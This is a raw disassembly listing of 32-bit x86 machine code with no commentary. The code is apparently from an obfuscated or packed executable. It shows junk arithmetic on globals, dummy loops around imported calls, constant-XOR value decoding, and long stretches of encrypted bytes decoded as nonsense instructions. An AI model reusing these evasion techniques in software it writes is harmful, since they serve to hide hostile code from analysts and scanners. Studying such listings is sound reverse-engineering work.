  408abb:	call   DWORD PTR ds:0x42eaac
  408ac1:	mov    ecx,DWORD PTR ds:0x42e76a
  408ac7:	dec    ecx
  408ac8:	mov    DWORD PTR ds:0x42e76a,ecx
  408ace:	jmp    0x408a92
  408ad3:	adc    DWORD PTR ds:0x42e766,0x3f8f
  408add:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  408ae4:	mov    eax,DWORD PTR [ebp-0x4]
  408ae7:	sbb    edx,0xd84
  408aed:	mov    edx,DWORD PTR [ebp+0x10]
  408af0:	xor    DWORD PTR ds:0x4304c2,0x464
  408afa:	mov    ecx,0x7510856
  408aff:	xor    eax,ecx
  408b01:	jmp    0x408cf5
  408b06:	jno    0x408b66
  408b08:	test   bl,ah
  408b0a:	gs in  eax,0x51
  408b0d:	or     BYTE PTR fs:[eax],dh
  408b10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b11:	outs   dx,DWORD PTR ds:[esi]
  408b12:	stos   DWORD PTR es:[edi],eax
  408b13:	pop    eax
  408b14:	outs   dx,DWORD PTR ds:[esi]
  408b15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b17:	sar    BYTE PTR [esi+0x7e],cl
  408b1a:	inc    ebp
  408b1b:	jg     0x408b9b
  408b1d:	jle    0x408adf
  408b1f:	imul   esi,edi,0x298060a2
  408b25:	rol    DWORD PTR [eax+ecx*8+0x4c205edd],1
  408b2c:	stos   BYTE PTR es:[edi],al
  408b2d:	cs push 0x1ea31881
  408b33:	mov    bh,0xb9
  408b35:	jp     0x408b4a
  408b37:	or     esp,DWORD PTR [esi-0x7e]
  408b3a:	int3   
  408b3b:	out    dx,eax
  408b3c:	and    ecx,DWORD PTR [ebx-0x6cab47f]
  408b42:	aam    0x7b
  408b44:	cli    
  408b45:	mov    bh,0x1d
  408b47:	ret    
  408b48:	cmp    DWORD PTR [ebx+0x31],esp
  408b4b:	mov    gs,WORD PTR gs:[eax+ebx*1]
  408b4f:	xchg   ecx,eax
  408b50:	pop    ds
  408b51:	mov    dl,0x2d
  408b53:	data16 gs data16 jbe 0x408bd3
  408b58:	jne    0x408b09
  408b5a:	pop    es
  408b5b:	cld    
  408b5c:	lds    edi,FWORD PTR [ebx+0x67]
  408b5f:	lds    esp,FWORD PTR [edx]
  408b61:	hlt    
  408b62:	xor    al,BYTE PTR [ecx]
  408b64:	pop    ebx
  408b65:	shl    DWORD PTR [eax+0x7fb409c7],1
  408b6b:	mov    dl,0x9f
  408b6d:	in     eax,0xd
  408b6f:	(bad)  
  408b70:	pop    esp
  408b71:	(bad)  
  408b72:	and    al,0x44
  408b74:	shl    bh,0xf5
  408b77:	mov    ebx,0xd96b531d
  408b7c:	rol    edi,1
  408b7e:	fidivr DWORD PTR [ebp-0xf]
  408b81:	jo     0x408b9f
  408b83:	jge    0x408ba5
  408b85:	jnp    0x408bf4
  408b87:	in     al,dx
  408b88:	push   eax
  408b89:	enter  0x83f6,0x43
  408b8d:	xchg   edx,eax
  408b8e:	cmp    eax,0xa9ce82fa
  408b93:	mov    gs,WORD PTR [eax-0x6df56b17]
  408b99:	pop    ebp
  408b9a:	xchg   esp,eax
  408b9b:	inc    esp
  408b9c:	mov    edi,0xf3965aa0
  408ba1:	in     al,0xec
  408ba3:	sbb    ebx,DWORD PTR [ebp+0x31]
  408ba6:	dec    esi
  408ba7:	jbe    0x408c28
  408ba9:	(bad)  
  408baa:	stos   DWORD PTR es:[edi],eax
  408bab:	jge    0x408be7
  408bad:	adc    eax,0x7997c596
  408bb2:	hlt    
  408bb3:	xchg   edx,eax
  408bb4:	pop    es
  408bb5:	jge    0x408bf3
  408bb7:	add    DWORD PTR [edx+0x1],eax
  408bba:	mov    al,0xb5
  408bbc:	(bad)  
  408bbe:	sub    ebx,DWORD PTR [edx+0x4a]
  408bc1:	xchg   esp,eax
  408bc2:	clc    
  408bc3:	fs mov edx,0xf81002df
  408bc9:	jge    0x408c0a
  408bcb:	mov    ch,0xed
  408bcd:	iret   
  408bce:	gs mov bl,0x7c
  408bd1:	jge    0x408bc8
  408bd3:	das    
  408bd4:	xchg   esp,eax
  408bd5:	cs pop ebx
  408bd7:	cwde   
  408bd8:	sbb    al,0x8d
  408bda:	pop    ss
  408bdb:	push   cs
  408bdc:	adc    edx,ebx
  408bde:	mov    bh,0x5d
  408be0:	in     eax,0xf
  408be2:	jp     0x408b6e
  408be4:	jbe    0x408bd4
  408be6:	adc    BYTE PTR [eax+0x27],dh
  408be9:	jmp    0xa0df:0x4b5e28d7
  408bf0:	sub    BYTE PTR [esi],dh
  408bf2:	mov    al,es:0x9e4bb66b
  408bf8:	sub    eax,0x84000994
  408bfd:	imul   eax,DWORD PTR [ebx-0x241ed532],0xffffffc3
  408c04:	rol    bh,cl
  408c06:	sbb    edi,DWORD PTR [edi-0x41]
  408c09:	mov    eax,0x11409fdf
  408c0e:	jns    0x408bc1
  408c10:	xchg   esi,eax
  408c11:	or     eax,0xab3e133e
  408c16:	sbb    al,0x28
  408c18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408c19:	stc    
  408c1a:	push   edi
  408c1b:	ds mov ah,0x1f
  408c1e:	mov    edi,0x794e0226
  408c23:	lock cmp eax,0x6577aa8d
  408c29:	fs call 0x5448fc98
  408c2f:	jo     0x408c4d
  408c31:	mov    ebp,DWORD PTR [eax+0x340a20b1]
  408c37:	cld    
  408c38:	mul    BYTE PTR [edx-0x3b6208a1]
  408c3e:	and    BYTE PTR [ecx],ah
  408c40:	stos   BYTE PTR es:[edi],al
  408c41:	jne    0x408cb7
  408c43:	inc    ecx
  408c44:	cwde   
  408c45:	push   edx
  408c46:	adc    edi,DWORD PTR [esi]
  408c48:	pop    ss
  408c49:	xchg   esp,eax
  408c4a:	jl     0x408c10
  408c4c:	pop    eax
  408c4d:	dec    ebx
  408c4e:	jge    0x408bda
  408c50:	lods   eax,DWORD PTR ds:[esi]
  408c51:	aam    0x86
  408c53:	jmp    0xd84b:0x1d0eb47a
  408c5a:	pusha  
  408c5b:	dec    eax
  408c5c:	jp     0x408c66
  408c5e:	fcmovu st,st(4)
  408c60:	aaa    
  408c61:	inc    esp
  408c62:	pop    eax
  408c63:	sub    ebx,DWORD PTR [ebp+0x2861b137]
  408c69:	or     al,0xd2
  408c6b:	scas   eax,DWORD PTR es:[edi]
  408c6c:	mov    edx,0x394aa7ed
  408c71:	sub    eax,0x2b8d0325
  408c76:	(bad)  
  408c78:	js     0x408c25
  408c7a:	fsub   DWORD PTR [edx+0x5e]
  408c7d:	retf   
  408c7e:	jnp    0x408cf9
  408c80:	stos   DWORD PTR es:[edi],eax
  408c81:	dec    eax
  408c82:	cdq    
  408c83:	jno    0x408ce4
  408c85:	call   0xa3989b11
  408c8a:	cs cli 
  408c8c:	repnz add al,0xa
  408c8f:	pop    ds
  408c90:	and    al,0xec
  408c92:	xor    eax,0x1a3ec3b
  408c97:	ret    
  408c98:	xor    al,0x4e
  408c9a:	retf   
  408c9b:	fdecstp 
  408c9d:	(bad)  
  408c9e:	loope  0x408cf1
  408ca0:	mov    BYTE PTR [edi],bl
  408ca2:	inc    ebx
  408ca3:	stos   BYTE PTR es:[edi],al
  408ca4:	mov    edx,0xb30159ec
  408ca9:	push   esp
  408caa:	out    dx,eax
  408cab:	les    esp,FWORD PTR [eax-0x7e3f1a45]
  408cb1:	popa   
  408cb2:	cmp    DWORD PTR [eax-0x56],ecx
  408cb5:	cli    
  408cb6:	add    al,BYTE PTR cs:[ecx]
  408cb9:	repnz and cl,BYTE PTR [edi]
  408cbc:	ins    DWORD PTR es:[edi],dx
  408cbd:	xor    eax,0x9d26d1a
  408cc2:	out    dx,al
  408cc3:	dec    eax
  408cc4:	sahf   
  408cc5:	dec    ebp
  408cc6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408cc7:	fiadd  DWORD PTR [ecx+0x4a]
  408cca:	aam    0x6
  408ccc:	sbb    bh,BYTE PTR [edx-0x77e55069]
  408cd2:	cmp    al,0x7b
  408cd4:	add    DWORD PTR [edi],ebp
  408cd6:	inc    edi
  408cd7:	mov    dh,0xdb
  408cd9:	cmp    DWORD PTR [ecx+eax*4+0x482811fd],edi
  408ce0:	push   eax
  408ce1:	ds mov ebp,0xa1bc8c1e
  408ce7:	repz pop ebp
  408ce9:	adc    BYTE PTR ds:0x37f1397f,0xc8
  408cf0:	sbb    dl,BYTE PTR ds:0x5c819c3
  408cf6:	popf   
  408cf7:	jb     0x408d2b
  408cf9:	add    BYTE PTR [ecx+0x76158b02],cl
  408cff:	add    eax,0x92a10043
  408d04:	add    eax,0xd02b0043
  408d09:	xor    edx,DWORD PTR [edx+eax*1]
  408d0c:	mov    eax,DWORD PTR [ebp+0x14]
  408d0f:	mov    edx,DWORD PTR [ebp+0x10]
  408d12:	mov    DWORD PTR [edx+0x4],eax
  408d15:	mov    eax,DWORD PTR [ebp+0x18]
  408d18:	mov    edx,DWORD PTR [ebp+0x10]
  408d1b:	mov    DWORD PTR [edx+0x8],eax
  408d1e:	mov    eax,DWORD PTR [ebp+0x1c]
  408d21:	mov    edx,DWORD PTR [ebp+0x10]
  408d24:	mov    DWORD PTR [edx+0xc],eax
  408d27:	mov    eax,DWORD PTR [ebp+0x20]
  408d2a:	mov    edx,DWORD PTR [ebp+0x10]
  408d2d:	mov    DWORD PTR [edx+0x10],eax
  408d30:	mov    eax,eax
  408d32:	mov    eax,DWORD PTR [ebp+0x14]
  408d35:	test   eax,eax
  408d37:	mov    eax,DWORD PTR [ebp+0x8]
  408d3a:	jne    0x408f37
  408d40:	mov    eax,DWORD PTR [ebp+0xc]
  408d43:	jmp    0x408f37
  408d48:	test   BYTE PTR [ebx+0x4d],al
  408d4b:	pushf  
  408d4c:	dec    ebp
  408d4d:	pushf  
  408d4e:	inc    ebp
  408d4f:	pop    ebx
  408d50:	cwde   
  408d51:	mov    ss,edx
  408d53:	aaa    
  408d54:	sti    
  408d55:	xchg   ecx,eax
  408d56:	add    edi,eax
  408d58:	mov    esp,ss
  408d5a:	jle    0x408dda
  408d5c:	inc    ebp
  408d5d:	jg     0x408ddd
  408d5f:	jle    0x408d31
  408d61:	adc    DWORD PTR [edx-0x7c],ebp
  408d64:	pop    ds
  408d65:	mov    eax,ds:0xb980ce08
  408d6a:	ds jmp 0x1cad5850
  408d70:	add    DWORD PTR [ecx+ecx*8],esi
  408d73:	sub    al,0xa7
  408d75:	push   esi
  408d76:	jmp    0xe05f:0x2b650168
  408d7d:	mov    ebx,0xbf25ce50
  408d82:	loopne 0x408df4
  408d84:	mov    dh,0xb4
  408d86:	sbb    cl,dl
  408d88:	cs stos DWORD PTR es:[edi],eax
  408d8a:	sub    ch,BYTE PTR [ebx-0x3]
  408d8d:	push   esp
  408d8e:	jge    0x408db3
  408d90:	out    dx,eax
  408d91:	data16 add BYTE PTR [ebx-0x31],ch
  408d95:	div    BYTE PTR [eax+0x73]
  408d98:	aaa    
  408d99:	bound  eax,QWORD PTR [edx+ebp*4+0x751f6ecf]
  408da0:	xchg   esp,eax
  408da1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408da2:	ss test eax,0xea9a4c28
  408da8:	stos   BYTE PTR es:[edi],al
  408da9:	addr16 jl 0x408d63
  408dac:	inc    esp
  408dad:	push   edx
  408dae:	jae    0x408d7d
  408db0:	mov    BYTE PTR [ebx+eiz*4+0x1d7ca819],dh
  408db7:	pop    ebp
  408db8:	mov    bh,0xec
  408dba:	pop    es
  408dbb:	pop    ecx
  408dbc:	(bad)  [eax+0x22]
  408dbf:	jmp    0x408de2
  408dc1:	cmp    ch,BYTE PTR [edx]
  408dc3:	retf   
  408dc4:	pop    ebx
  408dc5:	pop    eax
  408dc6:	sub    DWORD PTR [ebp-0x12a978ef],edi
  408dcc:	imul   ebx,DWORD PTR [esi-0x43],0xe2f8bbe4
  408dd3:	pop    ds
  408dd4:	(bad)  
  408dd5:	push   esi
  408dd6:	xor    ebx,edi
  408dd8:	push   0x76
  408dda:	lods   eax,DWORD PTR ds:[esi]
  408ddb:	arpl   WORD PTR [edx-0x443ded17],bx
  408de1:	sbb    eax,0x7d05d7f9
  408de6:	es mov dl,0x88
  408de9:	sub    DWORD PTR [ecx-0x6d9276f4],0xca3d7229
  408df3:	pop    ecx
  408df4:	stos   DWORD PTR es:[edi],eax
  408df5:	mov    ds:0x371ab7d2,al
  408dfa:	pop    edi
  408dfb:	inc    esp
  408dfc:	mov    ecx,0x91df938
  408e01:	xchg   esp,eax
  408e02:	sbb    cl,BYTE PTR [edx+0x1d]
  408e05:	mov    ebx,0x65f3f9c0
  408e0a:	jne    0x408e7e
  408e0c:	xor    al,0x79
  408e0e:	in     al,0x1
  408e10:	xchg   ebx,eax
  408e11:	int    0x86
  408e13:	mov    ebp,DWORD PTR [eax-0x20534ddf]
  408e19:	sbb    DWORD PTR [ebp-0x3b8628e3],eax
  408e1f:	cdq    
  408e20:	(bad)  
  408e21:	enter  0x1f14,0xfe
  408e25:	retf   0x1a7f
  408e28:	(bad)  
  408e2a:	daa    
  408e2b:	mov    esp,0x89976e41
  408e30:	jnp    0x408dd0
  408e32:	and    BYTE PTR [esi+0x80649b2],dl
  408e38:	dec    eax
  408e39:	(bad)  
  408e3a:	xor    ch,cl
  408e3c:	adc    ecx,ebp
  408e3e:	(bad)  
  408e3f:	mov    ds:0xb7eaaf2b,al
  408e44:	outs   dx,DWORD PTR ds:[esi]
  408e45:	push   ebx
  408e46:	xchg   DWORD PTR [ebp+edx*4+0x59],eax
  408e4a:	scas   al,BYTE PTR es:[edi]
  408e4b:	pushf  
  408e4c:	xchg   BYTE PTR [ecx-0x1bcd9c8b],bh
  408e52:	out    0x62,eax
  408e54:	jg     0x408e96
  408e56:	fs loope 0x408e93
  408e59:	pop    eax
  408e5a:	adc    BYTE PTR [ebx-0x51],bl
  408e5d:	cmp    al,0x19
  408e5f:	cmp    al,0xf3
  408e61:	ret    
  408e62:	scas   eax,DWORD PTR es:[edi]
  408e63:	sahf   
  408e64:	inc    ecx
  408e65:	sbb    eax,0x867a1fd5
  408e6a:	mov    bl,0xcd
  408e6c:	fsubr  st,st(2)
  408e6e:	sbb    DWORD PTR [ecx+0x31075193],0x31
  408e75:	xchg   BYTE PTR [edi-0x7719860f],dl
  408e7b:	push   edi
  408e7c:	nop
  408e7d:	inc    eax
  408e7e:	test   eax,0x1d44f270
  408e83:	inc    ebp
  408e84:	cld    
  408e85:	mov    ds:0x516c415,al
  408e8a:	mov    ?,WORD PTR [ebx-0x3892e2e6]
  408e90:	cmp    eax,0x610d0c2a
  408e95:	adc    dl,BYTE PTR ds:0xffa49a3e
  408e9b:	rol    BYTE PTR [eax-0x2a48688f],cl
  408ea1:	sbb    ebx,ecx
  408ea3:	jmp    0xbac3:0xf23de5d4
  408eaa:	div    DWORD PTR [edi]
  408eac:	pop    esi
  408ead:	mov    bl,0x66
  408eaf:	lds    ebp,FWORD PTR [eax-0x7e]
  408eb2:	ds mov cl,0x1
  408eb5:	sbb    al,bh
  408eb7:	xor    eax,0xcbc032a
  408ebc:	push   ecx
  408ebd:	xor    DWORD PTR [eax+0x0],0xc8ce85ec
  408ec4:	add    DWORD PTR [edx-0x4da39c7e],edi
  408eca:	jno    0x408e99
  408ecc:	dec    eax
  408ecd:	jne    0x408e94
  408ecf:	push   es
  408ed0:	adc    eax,0xde1aaf9e
  408ed5:	ss mov ecx,0xd5c0dc12
  408edb:	push   edx
  408edc:	ins    BYTE PTR es:[edi],dx
  408edd:	dec    esp
  408ede:	sub    ah,BYTE PTR [ebp+0x51]
  408ee1:	sub    DWORD PTR [ecx-0x4fdf8351],0x428f639e
  408eeb:	inc    ecx
  408eec:	dec    ebx
  408eed:	in     al,dx
  408eee:	add    dh,0xc
  408ef1:	pop    ss
  408ef2:	and    DWORD PTR [ebp-0x456aefec],ebx
  408ef8:	scas   eax,DWORD PTR es:[edi]
  408ef9:	push   ecx
  408efa:	lahf   
  408efb:	mov    BYTE PTR [ebx+0x56],cl
  408efe:	sbb    edx,ecx
  408f00:	xchg   ebp,eax
  408f01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408f02:	rcr    DWORD PTR [ebx+0x51682090],0x90
  408f09:	enter  0x96cb,0x9e
  408f0d:	fild   WORD PTR [ecx-0x3e]
  408f10:	add    DWORD PTR [esi],ebp
  408f12:	lods   eax,DWORD PTR ds:[esi]
  408f13:	push   eax
  408f14:	retf   
  408f15:	jmp    0x408ecc
  408f17:	and    DWORD PTR [ebp+eiz*8-0x624e15c0],esi
  408f1e:	inc    eax
  408f1f:	mov    cs,WORD PTR [eax-0x2f]
  408f22:	xor    BYTE PTR [esi+0x7a],bl
  408f25:	xchg   edi,eax
  408f26:	dec    ebp
  408f27:	mov    ch,0x14
  408f29:	pop    esp
  408f2a:	jg     0x408f1b
  408f2c:	outs   dx,BYTE PTR ds:[esi]
  408f2d:	or     ebx,edi
  408f2f:	lock aas 
  408f31:	out    dx,al
  408f32:	sub    ebp,edx
  408f34:	ins    BYTE PTR es:[edi],dx
  408f35:	rol    DWORD PTR [edi+0x33],0xc1
  408f39:	add    eax,0x32729d
  408f3e:	leave  
  408f3f:	ret    0x1c
  408f42:	push   ebp
  408f43:	mov    ebp,esp
  408f45:	sub    esp,0x10c
  408f4b:	push   ebx
  408f4c:	sbb    DWORD PTR ds:0x42ee08,0x42e76a
  408f56:	push   esi
  408f57:	push   edi
  408f58:	xor    DWORD PTR ds:0x430546,0x5477
  408f62:	push   0x412320
  408f67:	sbb    DWORD PTR ds:0x42ee28,0x42e766
  408f71:	call   DWORD PTR ds:0x42ea4c
  408f77:	sbb    DWORD PTR ds:0x42e762,0x6315
  408f81:	test   eax,eax
  408f83:	je     0x408f9a
  408f89:	or     DWORD PTR ds:0x4304ae,0x658e
  408f93:	xor    eax,eax
  408f95:	jmp    0x40a1a9
  408f9a:	or     DWORD PTR ds:0x4304b2,0x1a2e
  408fa4:	push   0x412364
  408fa9:	call   DWORD PTR ds:0x42eb04
  408faf:	sbb    DWORD PTR ds:0x430552,0x34b4
  408fb9:	test   ax,ax
  408fbc:	mov    DWORD PTR ds:0x42e75a,0xd26
  408fc6:	je     0x408feb
  408fcc:	push   0x786876
  408fd1:	push   0x55897097
  408fd6:	adc    DWORD PTR ds:0x4304c2,0x42ee08
  408fe0:	call   DWORD PTR ds:0x42eb80
  408fe6:	jmp    0x40a1a9
  408feb:	sub    DWORD PTR ds:0x42ee24,0x1c30
  408ff5:	call   DWORD PTR ds:0x42eb44
  408ffb:	cdq    
  408ffc:	cmp    eax,0x67876766
  409001:	mov    DWORD PTR ds:0x43055a,0x4f36
  40900b:	jne    0x409041
  409011:	cmp    edx,0x86189768
  409017:	mov    DWORD PTR ds:0x42ee14,0x24b9
  409021:	jne    0x409041
  409027:	sub    DWORD PTR ds:0x42e762,0x452
  409031:	push   0x412380
  409036:	call   DWORD PTR ds:0x42ea3c
  40903c:	jmp    0x40a1a9
  409041:	neg    DWORD PTR ds:0x4304aa
  409047:	push   0x4123e0
  40904c:	adc    DWORD PTR ds:0x42ee24,0x43049a
  409056:	call   DWORD PTR ds:0x42eadc
  40905c:	test   ax,ax
  40905f:	jne    0x408f89
  409065:	and    DWORD PTR ds:0x42e762,0x0
  40906f:	xor    ebx,ebx
  409071:	xor    ebx,DWORD PTR ds:0x42e762
  409077:	inc    ebx
  409078:	mov    DWORD PTR ds:0x42e762,ebx
  40907e:	cmp    DWORD PTR ds:0x42e762,0x28
  409085:	jne    0x409097
  40908b:	push   DWORD PTR [ebp-0x10]
  40908e:	push   DWORD PTR [ebp-0x18]
  409091:	call   DWORD PTR ds:0x42ebac
  409097:	cmp    DWORD PTR ds:0x42e762,0x1c
  40909e:	jb     0x40906f
  4090a4:	mov    edx,DWORD PTR ds:0x42ee14
  4090aa:	and    DWORD PTR ds:0x42ee20,edx
  4090b0:	mov    ecx,0xf89c8535
  4090b5:	movzx  edx,BYTE PTR ds:0x43048e
  4090bc:	sbb    edx,DWORD PTR ds:0x43054e
  4090c2:	mov    DWORD PTR ds:0x43048e,edx
  4090c8:	mov    DWORD PTR [ebp-0x20],ecx
  4090cb:	and    DWORD PTR ds:0x43049e,0x0
  4090d5:	mov    edx,DWORD PTR ds:0x43049e
  4090db:	inc    edx
  4090dc:	mov    DWORD PTR ds:0x43049e,edx
  4090e2:	cmp    DWORD PTR ds:0x43049e,0x21
  4090e9:	jne    0x409109
  4090ef:	push   0x59b7
  4090f4:	push   0x42e77a
  4090f9:	push   0x42e8ad
  4090fe:	push   0x7470
  409103:	call   DWORD PTR ds:0x42ebb0
  409109:	cmp    DWORD PTR ds:0x43049e,0x15
  409110:	jb     0x4090d5
  409116:	and    DWORD PTR ds:0x42e766,0x0
  409120:	mov    edx,DWORD PTR ds:0x42e766
  409126:	inc    edx
  409127:	mov    DWORD PTR ds:0x42e766,edx
  40912d:	cmp    DWORD PTR ds:0x42e766,0x20
  409134:	jne    0x40914a
  40913a:	push   0x704d
  40913f:	push   0x180e
  409144:	call   DWORD PTR ds:0x42eab0
  40914a:	cmp    DWORD PTR ds:0x42e766,0x13
  409151:	jb     0x409120
  409157:	adc    DWORD PTR ds:0x43049a,edi
  40915d:	mov    DWORD PTR [ebp-0x18],0xf89c8532
  409164:	and    DWORD PTR ds:0x43048a,0x0
  40916e:	mov    esi,DWORD PTR ds:0x43048a
  409174:	inc    esi
  409175:	mov    DWORD PTR ds:0x43048a,esi
  40917b:	cmp    DWORD PTR ds:0x43048a,0xd
  409182:	jne    0x40919d
  409188:	push   0x42e87b
  40918d:	push   0x42e77a
  409192:	push   0x400000
  409197:	call   DWORD PTR ds:0x42eac8
  40919d:	cmp    DWORD PTR ds:0x43048a,0xc
  4091a4:	jne    0x4091b7
  4091aa:	mov    esi,DWORD PTR ds:0x43048a
  4091b0:	inc    esi
  4091b1:	mov    DWORD PTR ds:0x43048a,esi
  4091b7:	cmp    DWORD PTR ds:0x43048a,0x14
  4091be:	jb     0x40916e
  4091c4:	sub    esi,DWORD PTR ds:0x42ee1c
  4091ca:	lea    eax,[ebp-0x58]
  4091cd:	mov    DWORD PTR [ebp-0x60],eax
  4091d0:	add    esi,esi
  4091d2:	lea    eax,[ebp-0x50]
  4091d5:	inc    ebx
  4091d6:	mov    DWORD PTR [ebp-0x10],eax
  4091d9:	inc    esi
  4091da:	mov    eax,ds:0x4121a8
  4091df:	mov    eax,DWORD PTR [eax+0x1c8]
  4091e5:	or     DWORD PTR ds:0x43054e,0x4304a2
  4091ef:	mov    eax,DWORD PTR [eax]
  4091f1:	add    esi,ebx
  4091f3:	mov    edx,DWORD PTR [ebp-0x10]
  4091f6:	xor    esi,esi
  4091f8:	xor    esi,DWORD PTR ds:0x43054e
  4091fe:	adc    DWORD PTR ds:0x42ee18,esi
  409204:	mov    esi,0x7510856
  409209:	xor    DWORD PTR ds:0x43048e,ebx
  40920f:	xor    eax,esi
  409211:	mov    ebx,0x32729d
  409216:	add    eax,ebx
  409218:	mov    DWORD PTR [edx],eax
  40921a:	mov    eax,ds:0x43048e
  40921f:	mov    eax,ds:0x4124e4
  409224:	cmp    eax,0x23d14057
  409229:	mov    eax,DWORD PTR [ebp-0x18]
  40922c:	mov    DWORD PTR ds:0x43048e,0x7d60
  409236:	je     0x409262
  40923c:	mov    ecx,DWORD PTR [ebp-0x20]
  40923f:	xor    eax,esi
  409241:	adc    DWORD PTR ds:0x43049e,0x4304ba
  40924b:	add    eax,ebx
  40924d:	imul   eax,ecx
  409250:	mov    DWORD PTR ds:0x4304ae,0x73a3
  40925a:	mov    DWORD PTR [ebp-0x20],eax
  40925d:	jmp    0x409dc0
  409262:	xor    eax,esi
  409264:	adc    edx,0x5f1b
  40926a:	add    eax,ebx
  40926c:	mov    ds:0x4122b8,eax
  409271:	mov    edx,DWORD PTR ds:0x4304e2
  409277:	mov    eax,ds:0x42e99c
  40927c:	sub    eax,edx
  40927e:	or     edx,DWORD PTR [edx+eax*1]
  409281:	mov    eax,DWORD PTR [ebp-0x20]
  409284:	xor    eax,esi
  409286:	add    eax,ebx
  409288:	mov    ds:0x4124e4,eax
  40928d:	sub    DWORD PTR ds:0x42e76e,0x78a9
  409297:	mov    eax,DWORD PTR [ebp-0x18]
  40929a:	add    edx,DWORD PTR ds:0x4304aa
  4092a0:	mov    edx,DWORD PTR ds:0x4122b8
  4092a6:	neg    DWORD PTR ds:0x4304ba
  4092ac:	xor    eax,esi
  4092ae:	dec    DWORD PTR ds:0x4304b2
  4092b4:	add    eax,ebx
  4092b6:	mov    DWORD PTR ds:0x430556,0x3216
  4092c0:	cmp    edx,eax
  4092c2:	jne    0x409dc0
  4092c8:	mov    eax,DWORD PTR [ebp-0x18]
  4092cb:	add    edx,0x2278
  4092d1:	mov    DWORD PTR [ebp-0x30],eax
  4092d4:	mov    eax,DWORD PTR [ebp-0x20]
  4092d7:	mov    DWORD PTR ds:0x42ee20,0x10
  4092e1:	cmp    DWORD PTR ds:0x42ee20,0x0
  4092e8:	je     0x409328
  4092ee:	cmp    DWORD PTR ds:0x42ee20,0x16
  4092f5:	jne    0x409310
  4092fb:	push   0x55c8
  409300:	push   0x6c0c
  409305:	push   0x400000
  40930a:	call   DWORD PTR ds:0x42eacc
  409310:	mov    edi,DWORD PTR ds:0x42ee20
  409316:	dec    edi
  409317:	mov    DWORD PTR ds:0x42ee20,edi
  40931d:	jmp    0x4092e1
  409322:	add    DWORD PTR ds:0x42ee14,ebx
  409328:	mov    DWORD PTR [ebp-0x1c],eax
  40932b:	or     DWORD PTR ds:0x42e776,0x513d
  409335:	mov    eax,ds:0x4121a8
  40933a:	mov    eax,DWORD PTR [eax+0x198]
  409340:	not    edx
  409342:	mov    DWORD PTR [ebp-0xc],eax
  409345:	xor    edx,edx
  409347:	add    edx,DWORD PTR ds:0x42e772
  40934d:	adc    edx,DWORD PTR ds:0x4304c2
  409353:	mov    DWORD PTR ds:0x42e772,edx
  409359:	mov    eax,DWORD PTR [ebp-0x1c]
  40935c:	mov    edx,DWORD PTR [ebp-0xc]
  40935f:	and    DWORD PTR ds:0x42ee2c,0x0
  409369:	mov    edi,DWORD PTR ds:0x42ee2c
  40936f:	inc    edi
  409370:	mov    DWORD PTR ds:0x42ee2c,edi
  409376:	cmp    DWORD PTR ds:0x42ee2c,0x6
  40937d:	jne    0x409391
  409383:	push   DWORD PTR [ebp-0x10]
  409386:	push   0x42e766
  40938b:	call   DWORD PTR ds:0x42ebb4
  409391:	cmp    DWORD PTR ds:0x42ee2c,0x5
  409398:	jne    0x4093ad
  40939e:	xor    edi,edi
  4093a0:	xor    edi,DWORD PTR ds:0x42ee2c
  4093a6:	inc    edi
  4093a7:	mov    DWORD PTR ds:0x42ee2c,edi
  4093ad:	cmp    DWORD PTR ds:0x42ee2c,0x1b
  4093b4:	jb     0x409369
  4093ba:	xor    DWORD PTR ds:0x4304b2,0x56f9
  4093c4:	xor    eax,esi
  4093c6:	and    DWORD PTR ds:0x42ee28,0x0
  4093d0:	jmp    0x4093e2
  4093d5:	mov    edi,DWORD PTR ds:0x42ee28
  4093db:	inc    edi
  4093dc:	mov    DWORD PTR ds:0x42ee28,edi
  4093e2:	cmp    DWORD PTR ds:0x42ee28,0x1f
  4093e9:	jae    0x40946a
  4093ef:	cmp    DWORD PTR ds:0x42ee28,0x6
  4093f6:	jne    0x409402
  4093fc:	call   DWORD PTR ds:0x42ead0
  409402:	cmp    DWORD PTR ds:0x42ee28,0x5
  409409:	jne    0x40941c
  40940f:	mov    edi,DWORD PTR ds:0x42ee28
  409415:	inc    edi
  409416:	mov    DWORD PTR ds:0x42ee28,edi
  40941c:	jmp    0x4093d5
  409421:	mov    DWORD PTR ds:0x42ee0c,0x12
  40942b:	cmp    DWORD PTR ds:0x42ee0c,0x0
  409432:	je     0x40946a
  409438:	cmp    DWORD PTR ds:0x42ee0c,0x21
  40943f:	jne    0x409450
  409445:	push   0x79c1
  40944a:	call   DWORD PTR ds:0x42eab4
  409450:	xor    edi,edi
  409452:	or     edi,DWORD PTR ds:0x42ee0c
  409458:	dec    edi
  409459:	mov    DWORD PTR ds:0x42ee0c,edi
  40945f:	jmp    0x40942b
  409464:	and    edi,DWORD PTR ds:0x43055a
  40946a:	add    eax,ebx
  40946c:	mov    DWORD PTR [edx],eax
  40946e:	lea    eax,[ebp-0x14]
  409471:	and    edi,DWORD PTR ds:0x43048a
  409477:	mov    DWORD PTR [ebp-0x44],eax
  40947a:	mov    edi,DWORD PTR ds:0x43049e
  409480:	adc    edi,DWORD PTR ds:0x42ee18
  409486:	mov    DWORD PTR ds:0x43049e,edi
  40948c:	mov    eax,DWORD PTR [ebp-0x1c]
  40948f:	sbb    DWORD PTR ds:0x42ee30,0x42e76a
  409499:	mov    edx,DWORD PTR [ebp-0x44]
  40949c:	sbb    DWORD PTR ds:0x42ee20,0x4304ba
  4094a6:	xor    eax,esi
  4094a8:	add    eax,ebx
  4094aa:	movzx  edi,WORD PTR ds:0x4304c2
  4094b1:	and    DWORD PTR ds:0x4304be,edi
  4094b7:	mov    DWORD PTR [edx],eax
  4094b9:	add    DWORD PTR ds:0x42e776,0x43049a
  4094c3:	mov    DWORD PTR [ebp-0x54],ecx
  4094c6:	or     edi,edi
  4094c8:	lea    eax,[ebp-0x54]
  4094cb:	mov    DWORD PTR [ebp-0x10],eax
  4094ce:	sub    ecx,DWORD PTR ds:0x4304a6
  4094d4:	mov    eax,DWORD PTR [ebp-0x54]
  4094d7:	mov    ecx,DWORD PTR [ebp-0x10]
  4094da:	mov    DWORD PTR ds:0x42ee2c,0x1c
